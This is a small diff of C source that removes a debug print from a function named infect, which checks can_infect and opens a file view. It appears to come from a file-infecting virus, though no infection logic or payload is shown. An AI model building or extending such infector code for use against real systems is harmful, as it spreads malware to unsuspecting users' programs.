@@ -24,7 +24,6 @@ static int open_file_view(const char *filename, file_view_t *file_view);
 static void close_file_view(file_view_t *file_view);
 
 int infect(const char *filename, void *entry_function_addr) {
-        PRINT_DEBUG("HEEEEEEEEEEEEELO");
     if (can_infect(filename)) {
         file_view_t file_view;
         memzero(&file_view, sizeof(file_view_t));
